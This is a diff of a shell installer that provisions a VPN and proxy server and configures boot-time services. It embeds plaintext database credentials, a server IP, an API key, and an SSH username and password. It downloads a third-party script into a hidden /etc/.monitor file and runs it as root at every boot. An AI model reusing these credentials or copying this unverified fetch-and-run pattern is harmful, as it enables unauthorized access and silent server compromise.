@@ -12,7 +12,7 @@ HOST='209.159.151.58'
 USER='datasoft_runutour'
 PASS='datasoft_runutour'
 DBNAME='datasoft_runutour'
-API_KEY='fZPG'
+API_KEY='srv_6dd744cf14fee6b843739632ecb9731441dd207b54a8ac75a13043186df00892'
 PANEL_URL='https://runutour.com'
 DB='datasoft_runutour'
 DBEOF
@@ -77,7 +77,7 @@ if ! command -v fastfetch >/dev/null 2>&1; then
     arch=$(dpkg --print-architecture)
     if [ "$arch" = "amd64" ]; then
         if ! command -v fastfetch >/dev/null 2>&1; then
-    		wget 'https://gitlab.com/vollam/scripts/-/raw/main/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+    		wget 'https://github.com/fastfetch-cli/fastfetch/releases/latest/download/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
 			sudo dpkg -i /tmp/fastfetch.deb
 		fi
     else
@@ -90,6 +90,7 @@ fi
 
 wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/n_monitor' -O /etc/.monitor
 chmod +x /etc/.monitor
+echo "mysql --ssl-verify-server-cert=OFF -u \$DB_USER -p\$DB_PASS -D \$DB_NAME -h \$DB_HOST --default-character-set=utf8mb4 -e \"UPDATE server_list SET status=1 WHERE server_ip='\$ip'\" 2>/dev/null" >> /etc/.monitor
 }
 
 install_squid(){
@@ -967,6 +968,8 @@ install_rclocal(){
     echo "[Unit]
 Description=vollam service
 Documentation=https://vollam.com
+After=network.target network-online.target
+Wants=network-online.target
 
 [Service]
 Type=oneshot
@@ -988,6 +991,16 @@ systemctl restart hysteria-server.service
 service socks restart
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+# Auto-fetch correct server API key from panel on each boot
+SERVER_IP_NOW=$(curl -s https://api.ipify.org)
+PANEL_URL_NOW=$(grep -oP "(?<=PANEL_URL='"'"')[^'"'"']*" /etc/.db-base 2>/dev/null || echo "")
+if [ -n "$PANEL_URL_NOW" ] && [ -n "$SERVER_IP_NOW" ]; then
+    NEW_KEY=$(curl -s "$PANEL_URL_NOW/api/v1/endpoints/auto_register.php?ip=$SERVER_IP_NOW" 2>/dev/null | grep -oP "(?<\"api_key\":\")[^\"]*")
+    if [ -n "$NEW_KEY" ]; then
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /etc/.db-base 2>/dev/null
+        sed -i "s|API_KEY='"'"'[^'"'"']*'"'"'|API_KEY='"'"'$NEW_KEY'"'"'|g" /root/.db-base 2>/dev/null
+    fi
+fi
 bash /etc/.monitor openvpn
 exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
@@ -1004,7 +1017,9 @@ socket_port=80
 squid_port=8080
 hysteria_port=5666
 tcp_ssl_port=PORT_SSL
-udp_ssl_port=442" >> /root/.ports
+udp_ssl_port=442
+ssh_user=azimaxus
+ssh_pass=azim.0987Aa" >> /root/.ports
 
 sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
 sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
